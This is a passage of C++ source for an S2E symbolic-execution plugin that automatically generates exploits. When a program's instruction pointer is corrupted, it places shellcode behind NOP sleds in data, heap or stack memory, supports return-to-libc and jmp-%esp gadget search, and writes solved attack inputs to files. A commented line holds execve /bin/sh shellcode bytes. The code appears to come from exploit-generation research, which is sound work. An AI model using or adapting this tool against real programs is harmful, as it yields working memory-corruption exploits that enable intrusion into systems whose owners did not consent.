/*
 * S2E Selective Symbolic Execution Framework
 *
 * Copyright (c) 2010, Dependable Systems Laboratory, EPFL
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 *       notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 *       notice, this list of conditions and the following disclaimer in the
 *       documentation and/or other materials provided with the distribution.
 *     * Neither the name of the Dependable Systems Laboratory, EPFL nor the
 *       names of its contributors may be used to endorse or promote products
 *       derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE DEPENDABLE SYSTEMS LABORATORY, EPFL BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * Currently maintained by:
 *    Vitaly Chipounov <vitaly.chipounov@epfl.ch>
 *    Volodymyr Kuznetsov <vova.kuznetsov@epfl.ch>
 *
 * All contributors are listed in S2E-AUTHORS file.
 *
 */
extern "C" {            
#include "config.h"     
#include "qemu-common.h"
}                       


#include "Exploit.h"
#include <s2e/S2E.h>
#include <s2e/ConfigFile.h>
#include <s2e/Utils.h>

#include <iostream>

#include <klee/Solver.h>
#include <s2e/S2EExecutor.h>    
#include <s2e/S2EExecutionState.h>

#include <iostream> 
#include <fstream> 
#include <vector> 
#include <utility> 
//#include <iomanip>


bool my_sort(const std::pair<uint32_t,uint32_t> a,const std::pair<uint32_t,uint32_t> b)
{
  return a.second > b.second;
}


namespace s2e {
  namespace plugins {

    S2E_DEFINE_PLUGIN(Exploit, "Expoit S2E plugin", "",);

    void Exploit::initialize()
    {
      type = s2e()->getConfig()->getInt(getConfigKey() + ".Type");
      shellcode = s2e()->getConfig()->getString(getConfigKey() + ".Shellcode");
      tainted_address = s2e()->getConfig()->getInt(getConfigKey() + ".TaintedAddress");


      std::cout << "type : " << type<< std::endl;
      //const char *text = shellcode.data();
      //std::cout << "shellcode : " << shellcode.c_str() << std::endl;
      //const char *sh = shellcode.c_str();
      //const char *ptr = NULL;
      //ptr = strtok(sh,"x");
      //while(ptr != NULL)
      //{
      //std::cout << ptr << std::endl;
      //ptr = strtok(NULL,"x");
      //}
      //m_traceBlockExecution = s2e()->getConfig()->getBool(
      //getConfigKey() + ".traceBlockExecution");
      s2e()->getCorePlugin()->onCorruptEip.connect(
	  sigc::mem_fun(*this, &Exploit::onCourruptEip));
    }

    void Exploit::onCourruptEip(S2EExecutionState *s, klee::ref<klee::Expr> value, klee::ref<klee::Expr> target)
    {

      klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (target);

      uint64_t target_address = 0;


      int where = 0;

      if(CE != NULL)
      {
	target_address = CE->getZExtValue();
	if(target_address ==(uint64_t) s->eip)
	{  
	  s2e()->getWarningsStream(s) << "[*] Eip is corrupted. vaule: " << value << " target: " << " EIP: " << std::hex << s->getPc() << std::endl; 
	  where = 1;
	}
	else if(target_address ==(uint64_t) s->ebp)
        {
	  s2e()->getWarningsStream(s) << "[*] Ebp is corrupted. vaule: " << value << " target: " << " EIP: " << std::hex << s->getPc() << std::endl;
          where = 2; 
        }
	else if(target_address ==(uint64_t) s->esp)
        {
	  s2e()->getWarningsStream(s) << "[*] Esp is corrupted. vaule: " << value << " target: " << " EIP: " << std::hex << s->getPc() << std::endl; 
          where = 3;
        }
      }
      else
      { 
	s2e()->getWarningsStream(s) << "[*] symbolic pointer(index) is corrupted. vaule: " << value << " target: " << target << " EIP: " << std::hex << s->getPc() << std::endl; 
         where = 4;
      }

/*
      if(s2e()->getExecutor()->getConcolicMode() && where == 1)
      {
	s->constraints.erase(s->constraints.getConcolicSize());
	s->constraints.setConcolicSize(0);
      }
*/
      //s2e()->getWarningsStream(s) << "[*] Plugin start." << std::endl;
      //s->dumpStack(40,s->getSp());             
      //s->dumpX86State(s2e()->getWarningsStream()); 

      eip_value = value;
      //s2e()->getWarningsStream(s) << "[Exploit]  Add Constraints." << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  register. " << s->getSymbolicRegistersMask() << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  eip. " << std::hex << s->getPc() << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  value. " << value.get() << std::endl;

      //s->dumpStack(128,s->getSp()-64);


      //s2e()->getWarningsStream(&s) << s2e()->getOutputFilename("exploit.txt") << std::endl;

      //s->addConstraint(klee::EqExpr::create(value, klee::ConstantExpr::alloc(0xaabbccff,klee::Expr::Int32)));

      //      klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32));
      //klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32), klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32));
      //s->addConstraint( klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32)));
      //bool res;
      //      klee::Solver::Validity res;
      //      klee::Query query(s->constraints, new_eip);//klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32)));

      //klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr>(query.expr);
      //s2e()->getWarningsStream(s) << "query? " << E << std::endl;
      //s2e()->getExecutor()->getSolver()->mustBeFalse(query, res);
      //      s2e()->getExecutor()->getSolver()->evaluate(query, res);
      //      s2e()->getWarningsStream(s) << "[*] true? " << res << std::endl;
      //s2e()->getExecutor()->getSolver()->mustBeTrue(query, res);
      //  s->addConstraint(new_eip);
      //if(0)

      //int num = 0;
      if(target_address ==(uint64_t) s->eip)
      {
	char name[20];
	if(/*testPointer(s, s->constraints, eip_value, 0xffffffff) &&*/ insertShellcode(s))//res != klee::Solver::False)
	  //if(1)
	{ 

	  //s->addConstraint(new_eip);
	  //uint32_t address;
	  //insertShellcode(s, value);
	  //klee::ref<klee::Expr> eip =  klee::EqExpr::create(value, klee::ConstantExpr::alloc(address ,klee::Expr::Int32));
	  //s->addConstraint(new_eip);

	  ConcreteInputs out;                                                  
	  bool success = s2e()->getExecutor()->getSymbolicSolution(*s, out);
	  if(success)
	  {




	    sprintf(name,"Exploit_%d.txt",num);
	    num++;
	    char * path = const_cast<char*> ( s2e()->getOutputFilename(name).c_str());
	    std::ofstream fout(path, std::ios::out | std::ios::binary);

	    ConcreteInputs::iterator it;                                                                             
	    for (it = out.begin(); it != out.end(); ++it) {                                                          
	      const VarValuePair &vp = *it;                                                                        
	      //    s2e()->getMessagesStream() << vp.first << ": ";                                                      

	      for (unsigned i=0; i<vp.second.size(); ++i) {
		fout.put((unsigned) vp.second[i]);                                                        
		//s2e()->getMessagesStream() << (unsigned) vp.second[i] << ' ';                                   
	      }                                                                                                    
	    }                                                                                                        
	    fout.close(); 
	  }
	  s2e()->getWarningsStream(s) << "[*] Generated Exploit. (" << name << ")"<< std::endl;
	  //exit(0);
	}
	s2e()->getExecutor()->terminateStateEarly(*s,"Exploit plugin terminate");
      }
      else if(where == 4)
      {
        if(type==1 || type == 3)
        {
          uint32_t start, size;
          getDataSeg(s, &start, &size);
          s2e()->getWarningsStream(s) << "start: " << start << " size: " << size << std::endl;
          uint32_t virtualAddress = start;
          uint64_t hostAddress = 0;            

          while(hostAddress !=  (uint64_t) -1 && virtualAddress <= start+size)
          {
            hostAddress =  s->getHostAddress(virtualAddress);
            if(hostAddress !=  (uint64_t) -1)              
            {
              klee::ObjectPair op = s->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);                                                                                      
              s2e()->getDebugStream(s) << "size " << op.second->size<< " ALL Concrete?: "<<op.second->isAllConcrete() << " offset " << (hostAddress & ~S2E_RAM_OBJECT_MASK) << std::hex << " address " << virtualAddress - (hostAddress & ~S2E_RAM_OBJECT_MASK) << " ~ "<< virtualAddress + (op.second->size - (hostAddress & ~S2E_RAM_OBJECT_MASK)) - 1<< " hostaddress: "<< hostAddress << " name: " << op.first->name << std::endl;

              unsigned int size = op.second->size;
              unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);                                                                                                                   
              virtualAddress = virtualAddress - offset;                                                                                                                                     
              for(unsigned int j=offset ; j<size && virtualAddress+j <= start+size ; j++)
              {
                if(op.second->isByteConcrete(j))
                {
                  klee::ref<klee::Expr> toData = klee::EqExpr::create(target, klee::ConstantExpr::create(virtualAddress+j ,klee::Expr::Int64));
                  bool res;
                  s2e()->getExecutor()->getSolver()->mayBeTrue(klee::Query(s->constraints, toData), res); 
                  if(res)
                    s->addConstraint(toData/*klee::EqExpr::create(target, klee::ConstantExpr::create(virtualAddress+j ,klee::Expr::Int64))*/);
                  hostAddress = (uint64_t)-1;
                  break;
                  
                }
              }
            }      

          }
        } 
      }
    }

    bool Exploit::insertShellcode(S2EExecutionState *state)
    {

      //s2e()->getWarningsStream(state) << "shellcode " << shellcode << std::endl;  
      //char code[] = "\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

      // for(std::vector<unsigned char>::iterator it = shellCodeVector.begin() ; it != shellCodeVector.end() ; it++)
      // {
      //   s2e()->getWarningsStream(state) << std::hex<< (int)*it << std::endl;
      //printf("%x\n",*it);
      // }
      //s2e()->getWarningsStream(state) << "shell size: " << shellCodeVector.size() << std::endl;
      //s2e()->getWarningsStream(state) << "[*] ----> Search for memory. size(" << shellCodeVector.size() << ")"<< std::endl;
      if(type == 1) // return to satck
      {
	std::vector<unsigned char> shellCodeVector = getShellcode(state, shellcode);

	s2e()->getWarningsStream(state) << "[*] Insert Shellcode (" << shellCodeVector.size() << " bytes)" << std::endl;
	std::vector<std::pair<uint32_t,uint32_t> > sym_table;

	uint32_t shellCode_start; 
	int nop_size;

	sym_table = searchDataOrHeap(state, true /*Data*/);
	//s2e()->getWarningsStream(state) << " Data segment : " << std::endl;
	nop_size = getMaxNopAndAddr(state, shellCodeVector, sym_table, eip_value, 0x90, "Data", &shellCode_start);
	if(nop_size != -1)
	{
	  //s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  addr << " nopsize: "<< std::dec << nop_size << std::endl;
	  addConstraints(state, shellCode_start, shellCodeVector, eip_value, shellCode_start, 0x90, nop_size);
	  return true;
	}
	/////////////////////////////////////////////////////////////////

	sym_table = searchDataOrHeap(state, false /*Heap*/);
	//s2e()->getWarningsStream(state) << " Heap : " << std::endl;
	nop_size =getMaxNopAndAddr( state, shellCodeVector, sym_table, eip_value, 0x90, "Heap", &shellCode_start);

	if(nop_size != -1)
	{
	  //	s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  shellCode_start << " nopsize: "<< std::dec << nop_size << std::endl;
	  addConstraints(state, shellCode_start, shellCodeVector, eip_value, shellCode_start, 0x90, nop_size);
	  return true;
	}

	///////////////////////////////////////////////////////////////////
	sym_table = searchStack(state);
	//s2e()->getWarningsStream(state) << " Stack : " << std::endl;
	nop_size = getMaxNopAndAddr(state, shellCodeVector, sym_table, eip_value, 0x90, "Stack", &shellCode_start);

	if(nop_size != -1)
	{
	  //	s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  shellCode_start << " nopsize: "<< std::dec << nop_size << std::endl;
	  addConstraints(state, shellCode_start, shellCodeVector, eip_value, shellCode_start, 0x90, nop_size);
	  return true;
	}
	/*
	   std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin();
	 *address = it->first;

	 int i;
	 for(i=0 ; i<28 ; i++)
	 {
	 klee::ref<klee::Expr> shell =  klee::EqExpr::create( state->readMemory8(*address + i) , klee::ConstantExpr::alloc(code[i] ,klee::Expr::Int8));
	 state->addConstraint(shell);
	 }
	 */
	return false;
      }
      else if(type == 2) // return to libc
      {

	//s2e()->getMessagesStream(state) << "EBP: " << state->getBp() << std::endl;
	//dumpStack(20,state->getSp());  
	state->dumpStack(40,state->getSp());
	state->dumpX86State(s2e()->getWarningsStream());

	std::vector<unsigned char> shellCodeVector;

	char *c_shellcode = new char [shellcode.size() + 1];          

	strcpy(c_shellcode, shellcode.c_str());

	for(unsigned int i=0 ; i<= strlen(c_shellcode) ; i++)
	{
	  shellCodeVector.push_back(*(c_shellcode + i));
	  //s2e()->getMessagesStream(state) << "shellcode: " << *(c_shellcode + i) << " "<<  std::hex << *(c_shellcode + i) << std::endl;
	  printf("%x\n",*(c_shellcode + i));
	}
	//shellCodeVector.push_back(strtol(' ', NULL, 16));

	//for(unsigned int i=0 ; i< shellCodeVector.size() ; i++)
	//s2e()->getMessagesStream(state) << "shellcode: " <<  shellCodeVector[i] << std::endl;

	//uint64_t hostAddress =  state->getHostAddress(state->getSp() + 4); 
	//if(hostAddress !=  (uint64_t) -1         //{
	//klee::ObjectPair op = stateaddressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
	//unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);

	//if(op.second->isByteKnownSymbolic(offset) && 
	//   op.second->isByteKnownSymbolic(offset + 1) &&
	//   op.second->isByteKnownSymbolic(offset + 2) &&
	//   op.second->isByteKnownSymbolic(offset + 3) )
	if(testPointer(state,  state->constraints, state->readMemory(state->getSp() + 4, klee::Expr::Int32), 0xffffffff))
	{
	  s2e()->getMessagesStream(state) << "check : address : " << std::hex << state->getSp() +4 << " value: "<< state->readMemory(state->getSp() + 4, klee::Expr::Int32)<< std::endl;

	  std::vector<std::pair<uint32_t,uint32_t> > sym_table;
	  int nop_size;
	  uint32_t shellCode_start;

	  sym_table = searchDataOrHeap(state, true /*Data*/); 
	  nop_size = getMaxNopAndAddr(state, shellCodeVector, sym_table, state->readMemory(state->getSp() + 4, klee::Expr::Int32), 0x20, "Data", &shellCode_start);

	  if(nop_size != -1)
	  {
	    addConstraints(state, shellCode_start, shellCodeVector, state->readMemory(state->getSp() + 4, klee::Expr::Int32), shellCode_start, 0x20, nop_size);
	    return true;
	  }          

	  sym_table = searchDataOrHeap(state, false /*Heap*/);     

	  nop_size =getMaxNopAndAddr( state, shellCodeVector, sym_table, state->readMemory(state->getSp() + 4, klee::Expr::Int32), 0x20, "Heap", &shellCode_start);                                 

	  if(nop_size != -1)                                                                                                                         
	  {                                                                                                                                          
	    addConstraints(state, shellCode_start, shellCodeVector, state->readMemory(state->getSp() + 4, klee::Expr::Int32), shellCode_start, 0x20, nop_size);                         return true;                                                                                                                             
	  }                                                                                                                                           

	  sym_table = searchStack(state);                                                                                                            
	  nop_size = getMaxNopAndAddr(state, shellCodeVector, sym_table, state->readMemory(state->getSp() + 4, klee::Expr::Int32), 0x20, "Stack", &shellCode_start);                                
	  if(nop_size != -1)                                                                                                                         
	  {                                                                                                                                          
	    addConstraints(state, shellCode_start, shellCodeVector, state->readMemory(state->getSp() + 4, klee::Expr::Int32), shellCode_start, 0x20, nop_size);                         return true;                                                                                                                             
	  }                                                                                                                                          


	}
	else
	{
	  s2e()->getMessagesStream(state) << "argument location cannot tained." << std::endl;
	  //return false;
	}
      return false;
	//}
      }
      else if (type == 3) // jmp to esp
      {
	s2e()->getWarningsStream(state) << "Exploit type : jump to %esp" << std::endl;
	//state->dumpStack(40,state->getSp());
	//state->dumpX86State(s2e()->getWarningsStream());
	/*
	   std::vector<unsigned char> shellCodeVector = getShellcode(state, shellcode);    
	   std::vector<std::pair<uint32_t,uint32_t> > sym_table;  
	   sym_table = searchStack(state);

	   std::vector<std::pair<uint32_t,uint32_t> >::iterator it;
	   for(it = sym_table.begin() ; it != sym_table.end() ; it++)
	   {
	   s2e()->getMessagesStream(state) << "jjjjjj: " << it->first << " == " << state->getSp() << std::endl;
	   if(it->first == state->getSp() && it->second >= shellCodeVector.size())
	   break;
	   }
	   if(it == sym_table.end())
	   return false;
	 */      


	uint32_t data_start, data_size;
	getDataSeg(state, &data_start, &data_size);

	//s2e()->getMessagesStream(state) << "start+size = " << std::hex << data_start+data_size << std::endl;


	bool get_ff = false;
	uint32_t virtualAddress = 0x08048000;
	uint64_t hostAddress = 0;
	uint32_t ffe4_address = 0;
	//s2e()->getMessagesStream(state) << "start + data : " << data_start + data_size << std::endl;
	while(hostAddress != (uint64_t)-1 && virtualAddress <= data_start+data_size)
	{
	  hostAddress = state->getHostAddress(virtualAddress);
	  if(hostAddress != (uint64_t) -1)
	  {
	    klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK); 
	    unsigned int size = op.second->size;
	    unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
	    virtualAddress = virtualAddress - offset;

	    for(unsigned int i=offset ; (i < size) && (virtualAddress+i <= data_start+data_size) ; i++)
	    {
	      klee::ref<klee::Expr> value = op.second->read8(i);
	      klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (value);

	      if(CE != NULL  && CE->getZExtValue(8) == 0xff)
	      {
		//s2e()->getMessagesStream(state) << "maaayyyyyy beeee!!!!" << std::endl;
		get_ff = true;
	      }
	      else if(CE != NULL && CE->getZExtValue(8) == 0xe4 && get_ff == true)
	      {  
		s2e()->getWarningsStream(state) << "jmp %esp (0xffef) address : " << std::hex << virtualAddress + i -1 << std::endl;
		ffe4_address = virtualAddress + i - 1;
		hostAddress = (uint64_t) -1;
		break;
	      }
	      else
	      {
		get_ff = false;
	      }
	      //s2e()->getMessagesStream(state) << std::hex<<"address: " << virtualAddress + i <<" offset: " << i << " value: "<< std::hex<< (CE->getZExtValue(8) ) << std::endl;
	    }

	  }
	  virtualAddress = virtualAddress + 128 ;
	}

	std::vector<unsigned char> shellCodeVector = getShellcode(state, shellcode);

	if(ffe4_address != 0 && -1 != testShellcode(state, state->getSp(), shellCodeVector, state->constraints, eip_value, ffe4_address, state->getSp(), 0))//testPointer(state, state->constraints, eip_value, ffe4_address))
	{
	  //s2e()->getMessagesStream(state) << "OOOOOOOOOOOOOOOOOOOOOOOKKKKKKKKKKK! " << std::endl;
	  addConstraints(state, state->getSp(), shellCodeVector, eip_value, ffe4_address, 0, 0);
	  return true;
	}
	//s2e()->getMessagesStream(state) << "NNNNNNNNNNNNNNNNNOOOOOOOOOOO!!!! "<< std::endl;
	std::vector<std::pair<uint32_t,uint32_t> > sym_table;
	sym_table = searchDataOrHeap(state, true /*Data*/);

	for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)
	{
	  //s2e()->getMessagesStream(state) << "first: " << it->first << " second: " << it->second << std::endl;
	  if(it->second >= 2)
	  {
	    for(unsigned int i=1 ; i<it->second ; i++)
	    {
	      klee::ConstraintManager cm = state->constraints;
	      klee::ref<klee::Expr> byte1 = klee::EqExpr::create(state->readMemory8(it->first + i -1), klee::ConstantExpr::create(0xff, klee::Expr::Int8));
	      klee::ref<klee::Expr> byte2 = klee::EqExpr::create(state->readMemory8(it->first + i), klee::ConstantExpr::create(0xe4, klee::Expr::Int8));
	      klee::ref<klee::Expr> ffe4_expr = klee::AndExpr::create(byte1, byte2);
	      //klee::Query query(state->constraints, byte3);
	      //klee::Solver::Validity res;
	      //s2e()->getExecutor()->getSolver()->evaluate(query, res);
	      cm.addConstraint(ffe4_expr);
	      if(/*res != klee::Solver::False &&*/ -1 != testShellcode(state, state->getSp(), shellCodeVector, cm, eip_value, it->first +i -1, state->getSp(), 0))
	      {
		state->addConstraint(ffe4_expr);
		addConstraints(state, state->getSp(), shellCodeVector, eip_value, it->first+i-1, 0, 0); 
		return true;
	      }
	    }
	  }
	} 
	return false;
      }
      //   else
      return false;
    }

    std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchStack(S2EExecutionState *state)
    {

      std::vector<std::pair<uint32_t,uint32_t> > sym_table;

      //uint32_t virtualAddress = state->getSp();
      uint32_t virtualAddress = 0xbfffffff;
      //uint32_t virtualAddress = 0x40000000;

      uint64_t hostAddress = 0;

      //std::vector<std::pair<uint32_t,uint32_t> >::iterator split;
      //for(int i=0 ; i<5 ; i++)
      while(hostAddress !=  (uint64_t) -1)
	//while(virtualAddress >= 0x08048000)
      {   
	hostAddress =  state->getHostAddress(virtualAddress);
	if(hostAddress !=  (uint64_t) -1) 
	{   
	  klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
	  s2e()->getDebugStream(state) << "size " << op.second->size<< " ALL Concrete?: "<<op.second->isAllConcrete() << " offset " << (hostAddress & ~S2E_RAM_OBJECT_MASK) << std::hex << " address " << virtualAddress - (hostAddress & ~S2E_RAM_OBJECT_MASK) << " ~ "<< virtualAddress + (op.second->size - (hostAddress & ~S2E_RAM_OBJECT_MASK)) - 1<< " hostaddress: "<< hostAddress << " name: " << op.first->name << std::endl;

	  int size = op.second->size;
	  unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
	  virtualAddress = virtualAddress - offset;

	  //s2e()->getMessagesStream() << std::endl;                                         
	  //dumpStack(size/4,virtualAddress);
	  if(! op.second->isAllConcrete())
	  {   
	    // state->dumpStack(size/4,virtualAddress);

	    //for(unsigned int j=0 ; j<size ; j++)
	    for(int j=size-1 ; j>=0 ; j--)
	    {   
	      if(op.second->isByteKnownSymbolic(j))
	      {   
		s2e()->getDebugStream(state) << "1.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << std::endl;

		int k=1;
		//for(j=j+1; j<size ;j++)
		for(j=j-1; j>=0 ;j--)
		{   
		  if(! op.second->isByteKnownSymbolic(j))
		  {   
		    break;
		  }   
		  k++;
		  s2e()->getDebugStream(state) << "2.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << " j : "<< j << std::endl;
		}   

		//s2e()->getMessagesStream(state) << std::hex << sym_table.back().first << " == " << (virtualAddress + j) - k << std::endl;
		if(!sym_table.empty() && (j+1) + k == size && virtualAddress + (j+1)+ k == sym_table.back().first )//sym_table.back().first == virtualAddress + j) 
		  //if(!sym_table.empty() && sym_table.back().first == virtualAddress + j) 
		  //if(!sym_table.empty() && (sym_table.back().first + sym_table.back().second) == (virtualAddress + j) - k ) 
		{
		  s2e()->getDebugStream(state) << "append " << std::hex << virtualAddress + (j + 1) << std::endl;
		  sym_table.back().first = virtualAddress + (j + 1)  ;
		  sym_table.back().second += k;
		}
		else
		{
		  s2e()->getDebugStream(state) << "add " << std::hex << (virtualAddress + j + 1) << std::endl;
		  std::pair<uint32_t, uint32_t> temp((virtualAddress + j + 1) , k);
		  sym_table.push_back(temp);

		}
	      }
	    }
	  }
	}
	virtualAddress = virtualAddress - 128;//size ;
      }

      std::vector<std::pair<uint32_t,uint32_t> >::iterator aa = sym_table.begin();
      std::vector<std::pair<uint32_t,uint32_t> >::iterator bb = sym_table.end();

      sort(aa, bb, my_sort);
      //my_sort(aa,bb);


      return sym_table;
    }

    std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchHeap(S2EExecutionState *s)
    {
      return searchDown2Up(s, 0x08048000, 0xffffffff);
    }   

    std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchDown2Up(S2EExecutionState *state,  uint32_t start, uint32_t end)
    {


      std::vector<std::pair<uint32_t,uint32_t> > sym_table;

      //uint32_t virtualAddress = state->getSp();
      //uint32_t virtualAddress = 0xbfffffff;
      //uint32_t virtualAddress = 0x40000000;
      //uint32_t virtualAddress = 0x08048000;
      uint32_t virtualAddress = start;

      uint64_t hostAddress = 0;

      //std::vector<std::pair<uint32_t,uint32_t> >::iterator split;
      //for(int i=0 ; i<5 ; i++)
      while(hostAddress !=  (uint64_t) -1 && virtualAddress <= end)
	//while(hostAddress !=  (uint64_t) -1)
	//while(virtualAddress <= 0xbfffffff)
      {   
	hostAddress =  state->getHostAddress(virtualAddress);
	if(hostAddress !=  (uint64_t) -1) 
	{   
	  klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
	  s2e()->getDebugStream(state) << "size " << op.second->size<< " ALL Concrete?: "<<op.second->isAllConcrete() << " offset " << (hostAddress & ~S2E_RAM_OBJECT_MASK) << std::hex << " address " << virtualAddress - (hostAddress & ~S2E_RAM_OBJECT_MASK) << " ~ "<< virtualAddress + (op.second->size - (hostAddress & ~S2E_RAM_OBJECT_MASK)) - 1<< " hostaddress: "<< hostAddress << " name: " << op.first->name << std::endl;

	  unsigned int size = op.second->size;
	  unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
	  virtualAddress = virtualAddress - offset;

	  //state->dumpStack(size/4,virtualAddress);
       //   s2e()->getDebugStream(state) << "concreteMask: " << op.second->concreteMask.get(25) << std::endl;
	  if(! op.second->isAllConcrete())
	  {   
	    // state->dumpStack(size/4,virtualAddress);

	    for(unsigned int j=offset ; j<size && virtualAddress+j <= end ; j++)
	      //for(int j=size-1 ; j>=0 ; j--)
	    {   
          //s2e()->getDebugStream(state) << "concreteMask: " << j << " "<< op.second->concreteMask->get(j) << std::endl;
	      if(op.second->isByteKnownSymbolic(j))
	      {   
		s2e()->getDebugStream(state) << "1.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << std::endl;

		unsigned int k=1;
		for(j=j+1; j<size ;j++)
		  //for(j=j-1; j>=0 ;j--)
		{   
          //s2e()->getDebugStream(state) << "concreteMask: " << j << " "<< op.second->concreteMask->get(j) << std::endl;
		  if(! op.second->isByteKnownSymbolic(j))
		  {   
		    break;
		  }   
		  k++;
		  s2e()->getDebugStream(state) << "2.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << " j : "<< j << std::endl;
		}   

		//s2e()->getMessagesStream(state) << std::hex << sym_table.back().first << " == " << (virtualAddress + j) - k << std::endl;
		if(!sym_table.empty() && j == k && virtualAddress == sym_table.back().first + sym_table.back().second )//sym_table.back().first == virtualAddress + j) 
		  //if(!sym_table.empty() && sym_table.back().first == virtualAddress + j) 
		  //if(!sym_table.empty() && (sym_table.back().first + sym_table.back().second) == (virtualAddress + j) - k ) 
		{
		  s2e()->getDebugStream(state) << "append " << std::hex << sym_table.back().first  << " "  << sym_table.back().second + k << std::endl;
		  //sym_table.back().first = virtualAddress  ;
		  sym_table.back().second += k;
		}
		else
		{
		  s2e()->getDebugStream(state) << "add " << std::hex << virtualAddress + j -k  << " " << k << std::endl;
		  std::pair<uint32_t, uint32_t> temp((virtualAddress + j -k) , k);
		  sym_table.push_back(temp);

		}
	      }
	    }
	  }
	}
	else
	{
	  //s2e()->getMessagesStream(state) << "NO~ " << std::hex << virtualAddress << std::endl;
	}
	virtualAddress = virtualAddress + 128;//size ;
      }

      std::vector<std::pair<uint32_t,uint32_t> >::iterator aa = sym_table.begin();
      std::vector<std::pair<uint32_t,uint32_t> >::iterator bb = sym_table.end();

      sort(aa, bb, my_sort);
      //my_sort(aa,bb);


      return sym_table;


    }

    std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchDataOrHeap(S2EExecutionState *state, bool which)
    {
      //uint32_t start = 0x804809c;
      //uint32_t size = 0x80480a8;

      //s2e()->getMessagesStream(state) << "Data segment : "<< std::hex << state->readMemory(start, klee::Expr::Int32) <<  " size: " << state->readMemory(size, klee::Expr::Int32) << std::endl;
      /*
	 uint32_t offset = expr2uint32(state->readMemory(0x804801c, klee::Expr::Int32));
      //uint32_t offset = CE->getZExtValue();
      s2e()->getDebugStream(state) << "offset : " << std::hex  <<offset << std::endl;

      offset = offset + 0x8048000;

      int num = 0;

      while(0x1 != expr2uint32(state->readMemory(offset, klee::Expr::Int32)) 
      || 0x8048000 == expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32)))// && offset <= 0x8048100)
      {
      if(0x1 == expr2uint32(state->readMemory(offset, klee::Expr::Int32)))
      num = 1;
      offset = offset + 0x20;
      }
       */
      uint32_t start;// = expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32));
      uint32_t size;// = expr2uint32(state->readMemory(offset+0x14, klee::Expr::Int32));
      getDataSeg(state, &start, &size);
      s2e()->getDebugStream(state) << "data segment : " << std::hex  << start << " size : " << size << std::endl;
      //std::vector<std::pair<uint32_t,uint32_t> > sym_table;
      //return sym_table;
      if(which == true)
	return searchDown2Up(state, start, start+size);
      else
	return searchDown2Up(state, start+size, 0xffffffff);
    }

    inline uint8_t expr2uint8(klee::ref<klee::Expr> expr)
    {
      klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (expr);
      return CE->getZExtValue();                                   

    }

    inline uint32_t Exploit::expr2uint32(klee::ref<klee::Expr> expr)
    {
      klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (expr);
      return CE->getZExtValue();
    }


    std::vector<unsigned char> Exploit::getShellcode(S2EExecutionState *state, std::string shellcode)
    {
      std::vector<unsigned char> code;

      char *c_shellcode = new char [shellcode.size() + 1];

      strcpy(c_shellcode, shellcode.c_str());
